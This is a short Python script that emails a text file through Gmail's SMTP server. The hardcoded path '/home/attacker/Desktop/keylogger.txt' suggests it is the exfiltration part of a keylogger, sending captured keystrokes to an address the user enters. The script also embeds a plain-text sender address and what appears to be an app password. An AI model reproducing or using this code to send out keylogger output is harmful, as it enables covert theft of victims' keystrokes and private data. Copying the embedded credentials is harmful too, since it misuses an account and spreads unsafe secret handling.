import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
def send_email_with_attachment(file_path):
    smtp_server = "smtp.gmail.com"
    port = 587
    sender_email = "9922018045@klu.ac.in"
    password = "swfvndkambcdgdso"  # Replace with your email password
    receiver_email = input("Enter the Receiver's Email ID:")  # Replace with the recipient's email address

    # Create a multipart message
    message = MIMEMultipart()
    message['Subject'] = 'Text File Attachment'
    message['From'] = sender_email
    message['To'] = receiver_email

    with open(file_path, 'r') as file:
        attachment = MIMEText(file.read())
        attachment.add_header('Content-Disposition', 'attachment', filename=file_path)
        message.attach(attachment)

    try:
        server = smtplib.SMTP(smtp_server, port)
        server.starttls()
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message.as_string())
        server.quit()
        print("Email sent successfully!")
    except Exception as e:
        print("An error occurred:", e)

text_file_path = '/home/attacker/Desktop/keylogger.txt'  # Replace with the actual path to your text file
send_email_with_attachment(text_file_path)
